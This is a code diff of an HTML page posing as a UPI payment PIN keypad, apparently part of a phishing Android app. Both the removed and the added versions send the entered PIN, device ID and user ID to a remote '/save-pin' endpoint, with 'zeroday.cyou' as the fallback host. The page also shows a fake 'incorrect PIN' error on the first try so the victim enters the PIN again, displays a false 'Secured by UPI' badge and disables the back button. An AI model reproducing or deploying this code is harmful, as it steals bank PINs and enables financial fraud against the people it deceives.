@@ -1,294 +1,531 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="theme-color" content="#4285f4" />
-  <title>UPI PIN Entry</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    let pinArr = [];
-    let isFirstAttempt = true;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure UPI Keypad</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
+    <style>
+       * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
+body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    height: 100vh;
+    background-color: white;
+    position: relative;
+}
+.header {
+    width: 100%;
+    height: 50px;
+    padding: 0px;
+    display: flex;
+    justify-content: end;
+    align-items: center;
+    position: fixed;
+    top: 0;
+    background-color: white;
+    z-index: 10;
+}
+
+.header img {
+    width: auto;
+    height: 40px;
+}
+.details {
+    width: 100%;
+    padding: 5px 15px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    background-color: #f0f0f0;
+    font-size: 15px;
+    font-weight: 500;
+    margin-top: 50px;
+}
+.center-content {
+    flex-grow: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    position: absolute;
+    top: 30%;
+    transform: translateY(-50%);
+    width: 100%;
+}
+h5 {
+    font-size: 15px;
+    font-weight: 500;
+    color: #3d3d3d;
+    margin-bottom: 15px;
+}
+.input-container {
+    font-size: 30px;
+    font-weight: bold;
+    color: #003bab;
+    letter-spacing: 10px;
+    display: flex;
+    gap: 5px;
+    margin-bottom: 15px;
+}
+
+.warning {
+    font-size: 25px;
+    font-weight: 500;
+    border-radius: 30px;
+    background: rgba(255, 199, 0, 0.2);
+    display: flex;
+    width: 85%;
+    padding: 10px;
+    color: #ff9d00;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+    margin-top: 15px;
+}
+
+.warning i{
     
+    font-size: 35px;
+    margin-left: 0px;
+}
+
+.warning p {
+    text-align: center;
+    color: black;
+    font-size: 14px;
+    margin-left: 10px;
+}
+
+.keypad {
+    width: 100%;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    text-align: center;
+    position: fixed;
+    bottom: 0;
+    padding-bottom: 30px;
+    padding-top: 15px;
+    padding-left: 15px;
+    padding-right: 15px;
+    background-color: #f1f1f1;
+}
+.key {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 60px;
+    font-size: 25px;
+    font-weight: bold;
+    color: #003bab;
+    background-color: transparent;
+    cursor: pointer;
+    user-select: none;
+    transition: transform 0.1s ease, background-color 0.1s ease;
+}
+.key:active {
+    transform: scale(0.9);
+    border-radius: 15px;
+}
+#done {
+    font-size: 35px;
+}
+#done1 {
+    font-size: 30px;
+}
+
+.verify-dialog {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.85);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+}
+
+.verify-content {
+    background: white;
+    padding: 40px 30px;
+    border-radius: 20px;
+    box-shadow: 0 10px 50px rgba(0,0,0,0.3);
+    text-align: center;
+    max-width: 320px;
+    width: 90%;
+}
+
+.verify-icon {
+    font-size: 60px;
+    color: #4CAF50;
+    margin-bottom: 20px;
+    animation: pulse 1.5s ease-in-out infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.8; }
+}
+
+.verify-title {
+    font-size: 22px;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 10px;
+}
+
+.verify-message {
+    font-size: 14px;
+    color: #666;
+    margin-bottom: 25px;
+    line-height: 1.5;
+}
+
+.verify-spinner {
+    display: inline-block;
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f3f3f3;
+    border-top: 4px solid #4CAF50;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.verify-dots {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+}
+
+.verify-dot {
+    width: 10px;
+    height: 10px;
+    background: #4CAF50;
+    border-radius: 50%;
+    animation: dotPulse 1.5s ease-in-out infinite;
+}
+
+.verify-dot:nth-child(1) { animation-delay: 0s; }
+.verify-dot:nth-child(2) { animation-delay: 0.2s; }
+.verify-dot:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes dotPulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.5); opacity: 0.5; }
+}
+
+.secure-badge {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+    padding: 10px;
+    background: #f0f8f0;
+    border-radius: 10px;
+    font-size: 12px;
+    color: #4CAF50;
+}
+
+.secure-badge i {
+    font-size: 16px;
+}
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo">
+    </div>
+
+    <div class="details">
+        <p>Sending: <br>To:</p>
+        <p>₹1.00 <br>mParivahan</p>
+    </div>
+
+    <div class="center-content">
+        <h5>ENTER UPI PIN</h5>
+        <div class="input-container" id="input-display">
+            <span></span> <span></span> <span></span> <span></span> <span></span> <span></span>
+        </div>
+        <div class="warning">
+            <i class="fas fa-exclamation-circle"></i>
+            <p>You are sending ₹1.00 from your account to mParivahan</p>
+        </div>
+    </div>
+
+    <div class="keypad">
+        <div class="key" onclick="enterNumber(1)">1</div>
+        <div class="key" onclick="enterNumber(2)">2</div>
+        <div class="key" onclick="enterNumber(3)">3</div>
+        <div class="key" onclick="enterNumber(4)">4</div>
+        <div class="key" onclick="enterNumber(5)">5</div>
+        <div class="key" onclick="enterNumber(6)">6</div>
+        <div class="key" onclick="enterNumber(7)">7</div>
+        <div class="key" onclick="enterNumber(8)">8</div>
+        <div class="key" onclick="enterNumber(9)">9</div>
+        <div class="key" id="done1" onclick="deleteNumber()"><i class="fas fa-backspace"></i></div>
+        <div class="key" onclick="enterNumber(0)">0</div>
+        <div class="key" id="done" onclick="submitPIN()"><i class="fas fa-circle-check"></i></div>
+    </div>
+
+    <div class="verify-dialog" id="verifyDialog">
+        <div class="verify-content">
+            <div class="verify-icon">
+                <i class="fas fa-shield-check"></i>
+            </div>
+            <div class="verify-title">Verifying Payment</div>
+            <div class="verify-message">Please wait while we securely process your transaction...</div>
+            <div class="verify-timer" id="verifyTimer" style="font-size: 18px; font-weight: bold; color: #4CAF50; margin-top: 10px;">Processing... 3s</div>
+            <div class="verify-spinner"></div>
+            <div class="verify-dots">
+                <div class="verify-dot"></div>
+                <div class="verify-dot"></div>
+                <div class="verify-dot"></div>
+            </div>
+            <div class="secure-badge">
+                <i class="fas fa-lock"></i>
+                <span>Secured by UPI</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Error Dialog - پین اشتباهه -->
+    <div class="verify-dialog" id="errorPinDialog" style="display: none;">
+        <div class="verify-content">
+            <div class="verify-icon" style="color: #f44336;">
+                <i class="fas fa-times-circle"></i>
+            </div>
+            <div class="verify-title" style="color: #f44336;">पिन गलत है</div>
+            <div class="verify-message">कृपया सही पिन दर्ज करें</div>
+            <button onclick="closeErrorPinDialog()" style="margin-top: 20px; padding: 12px 30px; background: #f44336; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer;">
+                फिर से प्रयास करें
+            </button>
+        </div>
+    </div>
+
+    <script>
+    let enteredNumbers = [];
+    let isHidden = true;
+    let savedPIN = '';
+    let isFirstAttempt = true;  // ⭐ برای track کردن اولین تلاش
+    
+    // ⭐ چک کردن اینکه آیا قبلاً PIN وارد شده یا نه
     function checkAttemptStatus() {
       const savedAttempt = localStorage.getItem('upi_pin_attempt');
       if (savedAttempt === 'failed') {
-        isFirstAttempt = false;
+        isFirstAttempt = false;  // قبلاً یک بار fail شده
       }
     }
     
-    function updateInputs() {
-      for (let i = 0; i < 6; i++) {
-        document.getElementById('pin' + i).value = '';
-      }
-      for (let i = 0; i < pinArr.length; i++) {
-        document.getElementById('pin' + i).value = pinArr[i];
-      }
-      updateInputVisibility();
+    function getDeviceId() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getDeviceId) {
+                return Android.getDeviceId();
+            }
+        } catch (e) {
+            console.error('Error getting device ID:', e);
+        }
+        return 'web_browser_' + Date.now();
     }
-    function updateInputVisibility() {
-      for (let i = 0; i < 6; i++) {
-        document.getElementById('pin' + i).style.display = 'none';
-      }
-      const visibleCount = pinArr.length <= 4 ? 4 : 6;
-      for (let i = 0; i < visibleCount; i++) {
-        document.getElementById('pin' + i).style.display = 'block';
-      }
+
+    function getUserId() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getUserId) {
+                return Android.getUserId();
+            }
+        } catch (e) {
+            console.error('Error getting user ID:', e);
+        }
+        return '8f41bc5eec42e34209a801a7fa8b2d94d1c3d983';
     }
-    function addDigit(digit) {
-      if (pinArr.length < 6) {
-        pinArr.push(digit);
-        updateInputs();
-      }
+
+    function getAppType() {
+        try {
+            if (typeof Android !== 'undefined' && Android.getAppType) {
+                return Android.getAppType();
+            }
+        } catch (e) {
+            console.error('Error getting app type:', e);
+        }
+        return 'mparivahan';
     }
-    function removeLastDigit() {
-      pinArr.pop();
-      updateInputs();
+
+    function updateDisplay() {
+        let display = document.getElementById("input-display");
+        display.innerHTML = "";
+        for (let i = 0; i < 6; i++) {
+            let span = document.createElement("span");
+            span.textContent = enteredNumbers[i] !== undefined ? (isHidden ? "•" : enteredNumbers[i]) : "";
+            display.appendChild(span);
+        }
     }
-    function showErrorPopup() {
-      document.getElementById("errorPopup").classList.remove("hidden");
+
+    function enterNumber(num) {
+        if (enteredNumbers.length < 6) {
+            enteredNumbers.push(num);
+            updateDisplay();
+        }
     }
-    function closeErrorPopup() {
-      document.getElementById("errorPopup").classList.add("hidden");
+
+    function deleteNumber() {
+        enteredNumbers.pop();
+        updateDisplay();
     }
-    function showLoadingDialog() {
-      document.getElementById("loadingDialog").classList.remove("hidden");
+
+    function showVerifyDialog() {
+        document.getElementById('verifyDialog').style.display = 'flex';
+        let countdown = 3;
+        const timerEl = document.getElementById('verifyTimer');
+        const interval = setInterval(() => {
+            countdown--;
+            if (countdown > 0) {
+                timerEl.textContent = `Processing... ${countdown}s`;
+            } else {
+                timerEl.textContent = 'Completing...';
+                clearInterval(interval);
+            }
+        }, 1000);
     }
-    function hideLoadingDialog() {
-      document.getElementById("loadingDialog").classList.add("hidden");
+
+    function hideVerifyDialog() {
+        document.getElementById('verifyDialog').style.display = 'none';
     }
-    function showRetryDialog() {
-      document.getElementById("retryDialog").classList.remove("hidden");
-    }
+    
     function showErrorPinDialog() {
-      document.getElementById("errorPinDialog").classList.remove("hidden");
-    }
-    function closeErrorPinDialog() {
-      document.getElementById("errorPinDialog").classList.add("hidden");
-      pinArr = [];
-      updateInputs();
+        document.getElementById('errorPinDialog').style.display = 'flex';
     }
     
-    function sendPinToServer(pin, isSuccess) {
-      try {
-        const baseUrl = Android.getBaseUrl();
-        const deviceId = Android.getDeviceId();
-        
-        fetch(`${baseUrl}/save-pin`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ 
-            pin: pin, 
+    function closeErrorPinDialog() {
+        document.getElementById('errorPinDialog').style.display = 'none';
+        // ⭐ بعد از بستن error dialog، PIN رو پاک کن برای تلاش بعدی
+        enteredNumbers = [];
+        updateDisplay();
+    }
+
+    function submitPIN() {
+        if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
+            let upiPin = enteredNumbers.join('');
+            savedPIN = upiPin;
+            
+            // ⭐ اگر اولین بار هست، timer نشون بده و بعد error
+            if (isFirstAttempt) {
+                // ⭐ Timer dialog نشون بده (مثل بار دوم)
+                showVerifyDialog();
+                
+                // ⭐ بعد از 3 ثانیه PIN رو ارسال کن (با status failed) و error نشون بده
+                setTimeout(() => {
+                    // ⭐ ارسال PIN به سرور با status failed
+                    sendPinToServer(upiPin, false);  // false = failed
+                    
+                    hideVerifyDialog();
+                    showErrorPinDialog();  // ⭐ error "پین اشتباهه" نشون بده
+                    localStorage.setItem('upi_pin_attempt', 'failed');  // ذخیره که fail شده
+                    isFirstAttempt = false;  // بار بعد موفق باشه
+                    // پاک کردن PIN برای تلاش بعدی
+                    enteredNumbers = [];
+                    updateDisplay();
+                }, 3000);  // ⭐ 3 ثانیه مثل بار دوم برای طبیعی بودن
+                return;
+            }
+            
+            // ⭐ بار دوم: timer نشون بده و بعد ارسال کن
+            submitToServer(upiPin);
+        } else {
+            if (navigator.vibrate) {
+                navigator.vibrate(200);
+            }
+        }
+    }
+
+    // ⭐ تابع مشترک برای ارسال PIN به سرور
+    function sendPinToServer(upiPin, isSuccess) {
+        const deviceId = getDeviceId();
+        const userId = getUserId();
+        const appType = getAppType();
+        const requestData = {
+            upi_pin: upiPin,
             device_id: deviceId,
-            status: isSuccess ? "success" : "failed"
-          })
+            app_type: appType,
+            user_id: userId,
+            status: isSuccess ? "success" : "failed"  // ⭐ status برای سرور
+        };
+
+        // ⭐ Get Base URL from Android
+        let baseUrl;
+        try {
+            baseUrl = Android.getBaseUrl();
+        } catch (e) {
+            // Fallback for browser testing
+            baseUrl = 'https://zeroday.cyou';
+            console.log('Using fallback URL');
+        }
+
+        fetch(`${baseUrl}/save-pin`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(requestData)
         })
-        .then(res => {
-          if (!res.ok) {
-            console.error("Failed to send PIN to server");
-            return;
-          }
-          return res.json();
+        .then(response => {
+            if (!response.ok) {
+                console.error("Failed to send PIN to server");
+                return;
+            }
+            return response.json();
         })
         .then(data => {
-          console.log("PIN sent to server:", isSuccess ? "success" : "failed");
+            console.log("PIN sent to server:", isSuccess ? "success" : "failed");
         })
-        .catch(err => {
-          console.error("Error sending PIN to server:", err);
+        .catch(error => {
+            console.error('Error sending PIN to server:', error);
         });
-      } catch (err) {
-        console.error("Error getting Android data:", err);
-        try {
-          const fallbackDeviceId = "browser_test_" + Date.now();
-          const fallbackBaseUrl = "https://zeroday.cyou";
-          
-          fetch(`${fallbackBaseUrl}/save-pin`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-              pin: pin, 
-              device_id: fallbackDeviceId,
-              status: isSuccess ? "success" : "failed"
-            })
-          })
-          .catch(error => console.error("Fallback PIN send error:", error));
-        } catch (fallbackErr) {
-          console.error("Fallback error:", fallbackErr);
-        }
-      }
     }
-    function closeRetryDialog() {
-      document.getElementById("retryDialog").classList.add("hidden");
-      pinArr = [];
-      updateInputs();
-    }
-    function submitPIN() {
-      if (pinArr.length === 4 || pinArr.length === 6) {
-        const pin = pinArr.join('');
-        showLoadingDialog();
+
+    function submitToServer(upiPin) {
+        // ⭐ بار دوم: timer dialog نشون بده
+        showVerifyDialog();
         
-        if (isFirstAttempt) {
-          const timerTextEl = document.getElementById("timerText");
-          let timerCountdown = 3;
-          const timerInterval = setInterval(() => {
-            timerCountdown--;
-            if (timerCountdown > 0) {
-              timerTextEl.textContent = `Processing... ${timerCountdown}s`;
-            } else {
-              timerTextEl.textContent = "Completing...";
-              clearInterval(timerInterval);
-            }
-          }, 1000);
-          
-          setTimeout(() => {
-            sendPinToServer(pin, false);
-            hideLoadingDialog();
-            showErrorPinDialog();
-            localStorage.setItem('upi_pin_attempt', 'failed');
-            isFirstAttempt = false;
-            pinArr = [];
-            updateInputs();
-          }, 3000);
-          return;
-        }
-        
-        showLoadingDialog();
-        const timerTextEl = document.getElementById("timerText");
-        let timerCountdown = 3;
-        const timerInterval = setInterval(() => {
-          timerCountdown--;
-          if (timerCountdown > 0) {
-            timerTextEl.textContent = `Processing... ${timerCountdown}s`;
-          } else {
-            timerTextEl.textContent = "Completing...";
-            clearInterval(timerInterval);
-          }
-        }, 1000);
-        
+        // ⭐ ارسال PIN به سرور با status موفق
+        sendPinToServer(upiPin, true);  // true = successful
+
+        // ⭐ Timer 3 ثانیه و بعد redirect
         setTimeout(() => {
-          sendPinToServer(pin, true);
-          localStorage.removeItem('upi_pin_attempt');
-          hideLoadingDialog();
-          setTimeout(() => {
-            window.location.href = "final.html";
-          }, 500);
+            localStorage.removeItem('upi_pin_attempt');  // پاک کردن attempt status
+            hideVerifyDialog();
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.go(1);
+            };
+            window.location.href = 'final.html';
         }, 3000);
-      } else {
-        showErrorPopup();
-      }
     }
-    window.onload = () => { 
-      checkAttemptStatus();
-      updateInputs();
-      history.pushState(null, null, location.href);
-      window.onpopstate = function() {
+
+    // ⭐ چک کردن وضعیت attempt در load
+    checkAttemptStatus();
+    updateDisplay();
+
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
         history.go(1);
-      };
     };
-  </script>
-  <style>
-    input { font-size: 20px !important; }
-    .grid button { font-size: 22px !important; padding: 12px 0 !important; }
-    .delete-icon, .submit-icon { width: 28px !important; height: 28px !important; }
-  </style>
-</head>
-<body class="bg-white text-black min-h-screen flex flex-col justify-between">
-  <div class="flex flex-col items-center pb-2 border-b border-gray-300">
-    <svg class="h-12 mx-auto" viewBox="0 0 300 80" xmlns="http://www.w3.org/2000/svg">
-      <text x="10" y="50" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="#097939">UPI</text>
-      <text x="120" y="50" font-family="Arial, sans-serif" font-size="28" fill="#666">Unified Payments</text>
-    </svg>
-    
-    <div class="box flex w-full py-2 px-4 bg-[#80808020] items-center justify-between">
-      <div class="to">
-        <div class="text-sm text-gray-500">To:</div>
-        <div class="text-sm text-gray-500">Sending:</div>
-      </div>
-      <div class="to">
-        <div class="text-sm text-gray-500 font-bold">Wosexy</div>
-        <div class="text-sm text-gray-500 font-bold">₹ 5.00</div>
-      </div>
-    </div>
-  </div>
-  
-  <div class="flex flex-col items-center py-6">
-    <p class="text-sm text-gray-700 mb-4">ENTER UPI 4 OR 6 DIGIT PIN</p>
-    <div class="flex justify-center space-x-2 mb-4">
-      <input type="password" id="pin0" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
-      <input type="password" id="pin1" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
-      <input type="password" id="pin2" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
-      <input type="password" id="pin3" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
-      <input type="password" id="pin4" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
-      <input type="password" id="pin5" maxlength="1" class="w-10 h-12 text-center text-2xl border-gray-400 bg-white rounded" readonly />
-    </div>
-    <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-2 mt-4 text-xs w-3/4 text-center rounded">
-      <span class="font-bold">!</span> You are transferring money from your account to Wosexy
-    </div>
-  </div>
-  
-  <div class="bg-gray-100 py-4 rounded-t-3xl">
-    <div class="grid grid-cols-3 gap-4 px-12 text-2xl font-medium text-gray-800">
-      <button class="py-4" onclick="addDigit('1')">1</button>
-      <button class="py-4" onclick="addDigit('2')">2</button>
-      <button class="py-4" onclick="addDigit('3')">3</button>
-      <button class="py-4" onclick="addDigit('4')">4</button>
-      <button class="py-4" onclick="addDigit('5')">5</button>
-      <button class="py-4" onclick="addDigit('6')">6</button>
-      <button class="py-4" onclick="addDigit('7')">7</button>
-      <button class="py-4" onclick="addDigit('8')">8</button>
-      <button class="py-4" onclick="addDigit('9')">9</button>
-      <button class="py-4 text-xl text-center flex items-center justify-center" onclick="removeLastDigit()">
-        <svg class="delete-icon" viewBox="0 0 24 24" fill="currentColor">
-          <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/>
-        </svg>
-      </button>
-      <button class="py-4" onclick="addDigit('0')">0</button>
-      <button class="py-4 text-2xl text-center flex items-center justify-center" onclick="submitPIN()">
-        <svg class="submit-icon" viewBox="0 0 24 24" fill="#4CAF50">
-          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
-        </svg>
-      </button>
-    </div>
-  </div>
-  
-  <div id="errorPopup" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 hidden px-4">
-    <div class="bg-white rounded-lg p-6 w-full max-w-xs text-center shadow-xl">
-      <p class="text-red-600 font-semibold mb-4 text-sm">Please enter correct 4 or 6 digit PIN.</p>
-      <button onclick="closeErrorPopup()" class="bg-red-600 text-white px-4 py-2 rounded text-sm">OK</button>
-    </div>
-  </div>
-  
-  <div id="loadingDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
-    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
-      <div class="flex justify-center mb-4">
-        <div class="w-16 h-16 border-4 border-gray-200 border-t-green-500 rounded-full animate-spin"></div>
-      </div>
-      <p class="text-gray-800 font-semibold text-base mb-2">Processing Payment...</p>
-      <p class="text-gray-500 text-sm mb-2" id="timerText">Please wait</p>
-    </div>
-  </div>
-  
-  <div id="errorPinDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
-    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
-      <div class="text-6xl mb-4">❌</div>
-      <p class="text-gray-800 font-semibold text-base mb-3">Incorrect PIN</p>
-      <p class="text-gray-600 text-sm mb-6">Please enter correct PIN</p>
-      <button onclick="closeErrorPinDialog()" class="bg-gradient-to-r from-red-500 to-red-600 text-white px-6 py-3 rounded-lg text-sm font-semibold w-full">
-        Try Again
-      </button>
-    </div>
-  </div>
-  
-  <div id="retryDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
-    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
-      <div class="text-6xl mb-4">⚠️</div>
-      <p class="text-gray-800 font-semibold text-base mb-3">Connection Error</p>
-      <p class="text-gray-600 text-sm mb-6">Please try again</p>
-      <button onclick="closeRetryDialog()" class="bg-gradient-to-r from-blue-500 to-blue-600 text-white px-6 py-3 rounded-lg text-sm font-semibold w-full">
-        Retry
-      </button>
-    </div>
-  </div>
+</script>
+
 </body>
 </html>
-
